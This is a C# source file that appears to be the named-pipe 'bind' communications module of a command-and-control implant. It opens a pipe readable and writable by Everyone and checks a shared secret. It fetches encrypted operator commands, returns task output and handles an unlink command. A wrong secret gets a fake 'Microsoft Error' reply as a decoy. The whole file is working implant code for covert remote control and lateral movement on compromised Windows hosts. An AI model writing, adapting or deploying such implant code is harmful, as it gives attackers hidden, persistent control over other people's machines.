using System;
using System.IO;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

#if PBIND
internal class NamedPipeComms : IComms
{
    private readonly Config _config;
    private NamedPipeServerInstance _server;


    internal NamedPipeComms(Config config)
    {
        _config = config;
        NewServerInstance();
    }

    public string GetCommands()
    {
        if (_server.ServerStream.IsConnected)
        {
#if DEBUG
            Program.STDOUT.WriteLine("[*] Getting commands");
#endif
            var encryptedGetCommandMessage = Encryption.Encrypt(_config.Key, "COMMAND");
            _server.PipeWriter.WriteLine(encryptedGetCommandMessage);
#if DEBUG
            Program.STDOUT.WriteLine("[*] Waiting for commands response");
#endif
            var response = _server.PipeReader.ReadLine();

            if (string.IsNullOrWhiteSpace(response))
            {
#if DEBUG
                Program.STDOUT.WriteLine("[*] Empty response, continuing");
#endif
                return null;
            }
#if DEBUG
            Program.STDOUT.WriteLine("[*] Got response");
#endif
            var command = Encoding.UTF8.GetString(Encryption.Decrypt(_config.Key, response));
            command = command.Trim().TrimEnd('\0');
#if DEBUG
            Utils.TrimmedPrint("[*] Decrypted commands: ", command);
#endif
            if (command.ToLower().Contains("pbind-unlink"))
            {
#if DEBUG
                Program.STDOUT.WriteLine("Unlinking implant");
#endif
                NewServerInstance();
                return null;
            }

            return command;
        }
#if DEBUG
        Program.STDOUT.WriteLine("[-] Cannot read from pipe when getting commands... creating new pipe");
#endif
        NewServerInstance();

        return null;
    }

    public void SendTaskOutputString(string taskId, string data)
    {
        if (!_server.ServerStream.IsConnected)
        {
#if DEBUG
            Program.STDOUT.WriteLine("[-] Cannot read from pipe when sending task string...");
#endif
            return;
        }

#if DEBUG
        Utils.TrimmedPrint("[*] Task string response to send: ", data);
#endif
        var encryptedData = Encryption.Encrypt(_config.Key, data);
#if DEBUG
        Utils.TrimmedPrint("[*] Encrypted response: ", encryptedData);
#endif
        _server.PipeWriter.WriteLine(encryptedData);
    }

    public void SendTaskOutputBytes(string taskId, byte[] data)
    {
        if (!_server.ServerStream.IsConnected)
        {
#if DEBUG
            Program.STDOUT.WriteLine("[-] Cannot read from pipe when sending task data...");
#endif
            return;
        }
#if DEBUG
        Program.STDOUT.WriteLine("[*] Writing task byte[] response");
#endif
        _server.PipeWriter.WriteLine(Encryption.Encrypt(_config.Key, data));
    }

    public string Stage(string environmentalInfo)
    {
        var passwordFromClient = _server.PipeReader.ReadLine();
        if (passwordFromClient != _config.PipeSecret)
        {
#if DEBUG
            Program.STDOUT.WriteLine("[*] Pipe secret is incorrect");
#endif
            _server.PipeWriter.WriteLine("Microsoft Error: 151337");
            Dispose();
            throw new Exception("0x1004");
        }
#if DEBUG
        Program.STDOUT.WriteLine("[*] Secret correct");
#endif
        var stageMessage = $"PBind-Connected: {environmentalInfo}";
        var encryptedMessage = Encryption.Encrypt(_config.Key, stageMessage);
        _server.PipeWriter.WriteLine(encryptedMessage);
#if DEBUG
        Program.STDOUT.WriteLine("[*] Sent stage info");
#endif

        return null;
    }

    private void NewServerInstance()
    {
        try
        {
            _server?.Dispose();
        }
        catch (Exception e)
        {
#if DEBUG
            Program.STDOUT.WriteLine($"Exception while disposing old instance: {e}");
#endif
        }

        _server = new NamedPipeServerInstance(_config);
    }

    public void Dispose()
    {
#if DEBUG
        Program.STDOUT.WriteLine("[*] Server disposing");
#endif
        _server?.Dispose();
    }

    private class NamedPipeServerInstance : IDisposable
    {
        internal NamedPipeServerStream ServerStream { get; }
        internal StreamWriter PipeWriter { get; }
        internal StreamReader PipeReader { get; }
        private Config Config { get; }

        public NamedPipeServerInstance(Config config)
        {
            Config = config;
            var pipeSecurity = new PipeSecurity();
            var sid = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
            var pipeAccessRule = new PipeAccessRule(sid, PipeAccessRights.ReadWrite | PipeAccessRights.CreateNewInstance, AccessControlType.Allow);
            pipeSecurity.AddAccessRule(pipeAccessRule);
#if DEBUG
            Program.STDOUT.WriteLine($"[*] Creating pipe with name {config.PipeName}");
#endif
            ServerStream = new NamedPipeServerStream(Config.PipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None, 4096,
                4096, pipeSecurity);
#if DEBUG
            Program.STDOUT.WriteLine("[*] Waiting for connection to pipe...");
#endif
            ServerStream.WaitForConnection();
#if DEBUG
            Program.STDOUT.WriteLine("[+] Client Connected");
#endif
            PipeWriter = new StreamWriter(ServerStream);
            PipeWriter.AutoFlush = true;
            PipeReader = new StreamReader(ServerStream);
        }

        public void Dispose()
        {
#if DEBUG
            Program.STDOUT.WriteLine("[*] Named pipe instance disposing");
#endif
            PipeWriter?.Dispose();
            PipeReader?.Dispose();
            ServerStream.Disconnect();
            ServerStream.Close();
            ServerStream.Dispose();
        }
    }
}
#endif